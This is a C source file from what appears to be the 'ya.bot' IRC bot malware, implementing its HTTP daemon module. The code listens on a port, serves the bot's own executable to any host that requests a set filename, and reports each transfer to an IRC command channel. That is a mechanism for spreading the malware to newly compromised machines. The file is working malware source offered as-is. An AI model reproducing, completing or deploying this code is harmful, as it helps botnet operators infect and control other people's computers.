/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_DAEMONHTTP
DWORD WINAPI daemon_httphandler(LPVOID param) 
{
	char szBuffer[MASBUF + 1], szFilePath[MAX_PATH], szRequest[64];
	DWORD dwRead, dwSize;
	HANDLE hFile;
	register int nSize;
	SDaemonHTTP s_dh = *((SDaemonHTTP *)param);
	sockaddr_in sin;

#ifndef NO_DEBUG
		debug_print("Handling http connection, daemon_httphandler()");
#endif

	if (recv(s_dh.m_csock, szBuffer, sizeof(szBuffer) - 1, 0) != SOCKET_ERROR)
	{
			_snprintf(szRequest, sizeof(szRequest) - 1,
					string_daemonhttprequest,
					daemonhttpfilename);
		if (strstr(szBuffer, szRequest))
		{
				nSize = sizeof(sin);
				getpeername(s_dh.m_csock, (sockaddr *)&sin, &nSize);
				GetModuleFileName(NULL, szFilePath, sizeof(szFilePath) - 1);
			if ((!s_dh.m_bSilent) && (s_dh.m_bVerbose))
					irc_message(s_dh.m_bsock,
					(char *)string_ircprivmsg, s_dh.m_szResultChannel,
							(char *)string_daemonhttptransferstarted,
							CBLUE, string_replyhttpd, CEND, string_replydotbot,
							CBLUE, daemonhttpfilename, CEND,
							CBLUE, CEND, inet_ntoa(sin.sin_addr),
							CBLUE, szFilePath, CEND);
				hFile = CreateFile(szFilePath,
						GENERIC_READ,
						FILE_SHARE_READ,
						NULL,
						OPEN_EXISTING,
						0,
						NULL);
			if (hFile != INVALID_HANDLE_VALUE)
			{
					SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
					dwSize = GetFileSize(hFile, NULL);
					_snprintf(szBuffer, sizeof(szBuffer) - 1,
							string_daemonhttpheader,
							"\r\n", "\r\n", "\r\n",
							dwSize, "\r\n",
							"\r\n", "\r\n");
					send(s_dh.m_csock, szBuffer, strlen(szBuffer), 0);
				do
				{
						ReadFile(hFile, szBuffer, sizeof(szBuffer) - 1, &dwRead, NULL);
						send(s_dh.m_csock, szBuffer, dwRead, 0);
				} while (dwRead == MASBUF);
					CloseHandle(hFile);
					closesocket(s_dh.m_csock);
					g_nTransfers++;
				if (!s_dh.m_bSilent)
						irc_message(s_dh.m_bsock,
								(char *)string_ircprivmsg, s_dh.m_szResultChannel,
								(char *)string_daemonhttptransferfinished,
								CGREEN, string_replyhttpd, CEND, string_replydotbot,
								CBLUE, daemonhttpfilename, CEND,
								CBLUE, CEND, inet_ntoa(sin.sin_addr),
								CBLUE, szFilePath, CEND);
					return 0;
			}
			if ((!s_dh.m_bSilent) && (s_dh.m_bVerbose))
					irc_message(s_dh.m_bsock,
							(char *)string_ircprivmsg, s_dh.m_szResultChannel,
							(char *)string_daemonhttptransferfailed,
							CRED, string_replyhttpd, CEND, string_replydotbot,
							CBLUE, daemonhttpfilename, CEND,
							CBLUE, CEND, inet_ntoa(sin.sin_addr));
		}
	}
		closesocket(s_dh.m_csock);
		return 0;
}

DWORD WINAPI daemon_httpmain(LPVOID param)
{
	SDaemonHTTP s_dhn, s_dho = *((SDaemonHTTP *)param);
	register int nSize;
	sockaddr_in sin;
	SOCKET sock, csock;

#ifndef NO_DEBUG
		debug_print("Starting http daemon, daemon_httpmain()");
#endif

		sin.sin_addr.s_addr = INADDR_ANY;
		sin.sin_family = AF_INET;
		sin.sin_port = htons(daemonhttpport);
		nSize = sizeof(sin);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
			thread_remove(THREAD_DAEMONHTTP);
			return 0;
	}
	if (bind(sock, (sockaddr *)&sin, nSize) == SOCKET_ERROR)
	{
			closesocket(sock);
			thread_remove(THREAD_DAEMONHTTP);
			return 0;
	}
	if (listen(sock, 10) == SOCKET_ERROR)
	{
			closesocket(sock);
			thread_remove(THREAD_DAEMONHTTP);
			return 0;
	}
		s_dhn = s_dho;
	while (TRUE)
	{
			csock = accept(sock, (sockaddr *)&sin, &nSize);
		if (csock != INVALID_SOCKET)
		{
				s_dhn.m_csock = csock;
				CreateThread(NULL, 0, daemon_httphandler, &s_dhn, 0, NULL);
		}
	}
		closesocket(csock);
		closesocket(sock);
		thread_remove(THREAD_DAEMONHTTP);
		return 0;
}
#endif